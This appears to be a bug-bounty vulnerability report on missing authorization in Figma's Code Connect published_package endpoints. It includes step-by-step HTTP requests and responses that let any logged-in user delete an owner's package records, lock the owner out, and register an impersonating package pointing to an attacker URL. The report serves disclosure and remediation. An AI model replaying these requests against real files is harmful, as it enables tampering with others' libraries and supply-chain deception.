# 标题 必填
title: Missing authorization on Code Connect published_package endpoints lets any logged-in user create/delete packages on public component libraries

# 资产 必填
Asset: https://www.figma.com
API: POST/DELETE /api/files/:file_key/published_package

# 严重程度 必填
Severity: MEDIUM

# 弱点 必填
Weakness: CWE-862 Missing Authorization

# 描述 必填
## Summary:
The Code Connect published package endpoints (`POST /api/files/:file_key/published_package` and `DELETE /api/files/:file_key/published_package/:id`) do not check whether the current user can edit the target file. Any authenticated Figma user can create and delete `published_package` records on any public component library file (files whose link access is "view" — view-only for everyone else).

The missing check is demonstrably endpoint-specific: on the SAME file, another write endpoint (`POST /api/integrations/github-app/figma-make/{file_key}/remove_repository_mapping`) returns 403 "You don't have permission to edit this file." for the same user, proving the user has no edit rights on the file, while `published_package` accepts the write.

## Steps To Reproduce:
Two accounts:
- Victim: account A, owns the public component library file `bv2nMIdFf4u3dESGail4sm` ("Dev Mode Test File"), link access = "view" (view-only public link).
- Attacker: account B, a separate account with no relationship to A or the file.

1. Confirm the file is view-only public:
   GET /api/files/bv2nMIdFf4u3dESGail4sm (as A or B)
   → meta.link_access = "view"  (anyone with the link can only view)

2. Confirm B has NO edit rights on the file via another endpoint:
   POST /api/integrations/github-app/figma-make/bv2nMIdFf4u3dESGail4sm/remove_repository_mapping
   → HTTP 403 {"message":"You don't have permission to edit this file."}

3. Create a package as B (no access to the file):
   POST /api/files/bv2nMIdFf4u3dESGail4sm/published_package
   {"package_identifier":"victim-pkg","package_type":"npm"}
   → HTTP 200 {"meta":{"id":"1ac21d1d-...","file_key":"bv2nMIdFf4u3dESGail4sm","package_identifier":"victim-pkg","package_type":"npm","source_url":null}}

4. Delete a package created by A (the owner) as B:
   DELETE /api/files/bv2nMIdFf4u3dESGail4sm/published_package/{id-created-by-A}
   → HTTP 200 {"meta":{"success":true}}

4b. Ownership check is also absent in the other direction: A (the file owner)
   can delete a package created by B — DELETE on B's package id → HTTP 200.
   Combined with step 4, deletion accepts ANY authenticated user regardless of
   who created the record or whether they can edit the file (full matrix: B can
   delete A's package, A can delete B's package, both succeed).

5. Owner impact: while B's package exists, A's own create request returns
   HTTP 409 "Published package already exists for this file" — B can keep
   re-creating packages to block A indefinitely, and can also inject
   arbitrary `source_url` and package names into the file's Code Connect metadata.

6. Anonymous requests are rejected (401 missing_authentication), so any
   logged-in Figma account can perform this.

## End-to-end impact demonstration (tested):
A realistic attack on the library's npm package registry, all steps verified:

| Step | Action | Result |
|---|---|---|
| 1 | A (owner) registers official package `@acme/ui` with source_url=https://github.com/acme/ui | HTTP 200, visible via livegraph `publishedPackages` view |
| 2 | B (no rights on the file) DELETEs A's package | HTTP 200 `{"meta":{"success":true}}` |
| 3 | A's view: `publishedPackages` is now empty `{}` — config destroyed | confirmed server-side |
| 4 | B registers a replacement with the SAME identifier and attacker source_url (https://evil.example.com/acme-ui-fork) | HTTP 200 |
| 5 | A tries to restore the official package | **HTTP 409 "Published package already exists for this file"** — owner is locked out; B can repeat delete+recreate indefinitely |
| 6 | All test artifacts cleaned up after testing | `publishedPackages` back to `{}` |

The record is part of the Schema-2025 "Import npm packages into Figma" feature set (package_type npm/private_npm/swift_pm + source_url, surfaced in the file's Packages settings sidebar, consumed by Figma Make / Dev Mode / Figma MCP context). Deleting it removes the file's code-package association that developers and AI agents rely on.

## Impact:
- **Integrity / metadata tampering**: any logged-in user can plant arbitrary `published_package` records (package_identifier, package_type ∈ npm/private_npm/swift_pm, source_url) on any public component library, polluting the Code Connect metadata that developers see in Dev Mode.
- **Denial of service on package creation**: the owner's own create call returns 409 while an attacker's package exists; the attacker can repeat creation to block the owner indefinitely.
- **Destruction of configuration**: attacker can delete packages created by the owner (DELETE succeeds with 200).
- **Supply-chain confusion**: attacker can impersonate official package identifiers on popular public libraries.

Affected surface: every public component library file (files with link access "view" that support Code Connect). Private libraries are NOT affected (B got 403 on a private team library).

## Root cause:
The endpoint validates that the file is a Code Connect-capable library but does not enforce file-level edit authorization for the current user, and DELETE does not check record ownership either. Contrast: `remove_repository_mapping` on the same file enforces the edit check (403). The write path effectively trusts only the "can read the file" (link access) level.

## Publicity check (pre-submission):
This is a WRITE-path authorization gap, not a public data leak:
- Publicity on Figma covers READ only: link access "view" means anyone with the link can view the file. There is no documentation anywhere stating that any logged-in user may CREATE or DELETE packages on other people's public libraries.
- Official Code Connect documentation states file-level management actions require elevated rights: "You must be the owner of the file you want to connect to GitHub or an organization admin." (help.figma.com Code Connect article).
- If writes were intended to be public, the sibling endpoint `remove_repository_mapping` (same code_connect client, same file, same user) would not return 403.
- The file owner is blocked by a uniqueness constraint (409 on duplicate package_identifier) while any other user can delete records at will — inconsistent with a designed-public surface.

## Suggested fix:
Require the same file-edit permission check used by other file-scoped write endpoints (e.g. verify the user is an editor of the file) before accepting create/delete of published packages. Confirm the behavior is not intended by checking whether anonymous users should be able to modify public libraries.
